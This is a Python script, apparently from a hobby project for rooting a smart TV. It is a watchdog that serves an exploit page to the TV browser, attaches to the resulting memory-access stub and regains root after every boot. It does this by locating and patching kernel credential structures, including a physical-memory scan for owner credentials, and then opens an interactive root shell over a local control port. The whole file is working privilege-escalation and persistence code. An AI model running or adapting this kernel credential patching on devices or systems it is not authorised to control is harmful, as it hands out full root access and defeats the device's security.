"""tv_rootwatch.py - re-arm root after every TV boot (host-side watchdog).

Why this exists: on this TV the on-boot app payload is the only *on-device*
persistence, and the app lane is one-way - once the payload is removed, the
browser lane can root the TV but cannot write the app's `bin/` again (see
docs/FAILED.md, "The app lane is one-way from a stock TV"). This watchdog is the
documented fallback: it watches for the exploit page's stub and roots it, so root
is available again shortly after each boot with no manual PC work.

What it does per cycle:
  1. make sure the port-80 server is listening (starts it with pysrv.exe if not);
  2. attach to the RPC gateway and prove the stub answers;
  3. root it - tail walk for the `PHYSRPC1` comm first (seconds), else a
     content scan for owner creds (ids `5001,100` x4 at cred+4, bounded to
     phys 0x20000000-0x40000000 because reads past 0x46000000 hang the stub);
  4. with --shell (default with --once) send op 5 so the server's control channel
     on 127.0.0.1:9999 becomes an interactive ROOT shell.

The one manual step is opening the TV browser on the page; set it as the
browser's start page once and the loop takes care of the rest.

Usage:
  python tools/tv_rootwatch.py --once --shell      # after a boot: root + shell
  python tools/tv_rootwatch.py --interval 15       # loop: keep re-arming
  python tools/tv_rootwatch.py --no-shell          # root only (op 7 stays unused)
"""
import argparse
import os
import socket
import struct
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

TOOLS = Path(__file__).resolve().parent
ROOT = TOOLS.parent
sys.path.insert(0, str(TOOLS))

import physmap as T          # noqa: E402
import kernel_root as K      # noqa: E402

INIT_V, INIT_P = 0xC0957180, 0x20957180
OFF = 0x23C
SCAN_START, SCAN_STOP = 0x20000000, 0x40000000
PAT = struct.pack("<8I", 5001, 100, 5001, 100, 5001, 100, 5001, 100)
STATE = TOOLS / "state"
LOG = STATE / "rootwatch.log"
SERVER_DIR = ROOT / "server"
PYSRV = Path(os.environ.get(
    "TVWATCH_PYSRV",
    r"C:\Users\Raghav\AppData\Local\Python\pythoncore-3.14-64\pysrv.exe"))


def log(msg):
    STATE.mkdir(parents=True, exist_ok=True)
    line = f"{datetime.now().isoformat(timespec='seconds')} {msg}\n"
    with LOG.open("a", encoding="utf-8") as fh:
        fh.write(line)
    print(line, end="", flush=True)


def port_open(port, host="127.0.0.1"):
    try:
        with socket.create_connection((host, port), timeout=1):
            return True
    except OSError:
        return False


def ensure_server():
    if port_open(80):
        return True
    if not (SERVER_DIR / "server.py").is_file() or not PYSRV.exists():
        log(f"server: cannot start (server.py present="
            f"{(SERVER_DIR / 'server.py').is_file()}, pysrv={PYSRV})")
        return False
    logs = SERVER_DIR / "logs"
    logs.mkdir(parents=True, exist_ok=True)
    out = open(logs / "server.out", "a", encoding="utf-8")
    err = open(logs / "server.err", "a", encoding="utf-8")
    subprocess.Popen([str(PYSRV), "server.py"], cwd=str(SERVER_DIR),
                     stdout=out, stderr=err,
                     creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
    for _ in range(20):
        if port_open(80):
            log("server: started on :80")
            return True
        time.sleep(0.25)
    log("server: DID NOT start (see server/logs/server.err)")
    return False


def live_stub(timeout=4.0):
    """An RPC whose stub answered a harmless read, else None."""
    try:
        rpc = T.RPC(timeout=timeout, hello_timeout=timeout)
    except Exception:
        return None
    try:
        rpc.s.settimeout(timeout)
        if rpc.read(INIT_P + 0x400, 8).startswith(b"swapper"):
            return rpc
    except Exception:
        pass
    try:
        rpc.close()
    except Exception:
        pass
    return None


def root_by_tail(rpc):
    """Patch the RPC thread itself (comm PHYSRPC1). Returns 'rooted'/'already'/None."""
    task = K._find_tag_near_tail(rpc, INIT_P, INIT_V, OFF, b"PHYSRPC1", 800)
    if not task:
        return None
    for off in (K.O_CRED, K.O_REAL):
        cred = rpc.read_u32(K.PHYS(task) + off)
        if not K._sane_cred(rpc, cred):
            continue
        ids = struct.unpack("<8I", rpc.read(K.PHYS(cred), 36)[4:])
        if ids[0] == 0:
            return "already"
        if ids[0] != 5001:
            continue
        if K.patch_full(rpc, cred):
            return "rooted"
    return None


def root_by_cred_scan(rpc):
    """Content scan for owner creds; list-independent. Returns count patched."""
    hits = set()
    page = SCAN_START
    while page < SCAN_STOP:
        count = min(4096, (SCAN_STOP - page) // 0x1000)
        for p, data in rpc.readmany(page, count):
            if data is None:
                continue
            i = data.find(PAT)
            while i >= 0:
                hits.add(p + i - 4)
                i = data.find(PAT, i + 1)
        page += count * 0x1000
    patched = 0
    for cred in sorted(hits):
        try:
            usage = T.u32(rpc.read(cred, 4))
        except Exception:
            continue
        if 2 <= usage <= 65536 and K.patch_full(rpc, cred):
            patched += 1
    return patched


def send_shell(rpc):
    try:
        rpc._cmd(5, 0, 0, 0)
        time.sleep(0.6)
        return True
    except Exception:
        return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--once", action="store_true")
    ap.add_argument("--interval", type=float, default=15.0)
    ap.add_argument("--no-shell", action="store_true")
    ap.add_argument("--no-scan", action="store_true",
                    help="tail walk only (skip the ~2 min cred scan)")
    args = ap.parse_args()

    shell_wanted = not args.no_shell
    log(f"watchdog start (once={args.once} shell={shell_wanted})")
    misses = 0
    while True:
        if not ensure_server():
            time.sleep(10)
            continue
        rpc = live_stub()
        if rpc is None:
            miss = T.reset_stub()
            log(f"no live stub -> RSET {miss}; waiting for the page")
            misses += 1
            if args.once and misses >= 3:
                return 1
            time.sleep(6)
            continue
        misses = 0
        try:
            state = root_by_tail(rpc)
            if state is None and not args.no_scan:
                log("tail walk missed; starting cred-content scan (~2 min)")
                n = root_by_cred_scan(rpc)
                log(f"cred scan patched {n} cred(s)")
                state = "rooted" if n else None
            if state:
                log(f"root: {state}")
                if shell_wanted:
                    if send_shell(rpc):
                        log("op5 sent - 127.0.0.1:9999 is now a ROOT shell "
                            "(drive it with tools/root_shell.py or recon sh5 attach)")
                        return 0
                if args.once:
                    return 0
            else:
                log("stub found but not rooted (will retry)")
        finally:
            try:
                rpc.close()
            except Exception:
                pass
        if args.once:
            return 1
        time.sleep(args.interval)


if __name__ == "__main__":
    sys.exit(main())
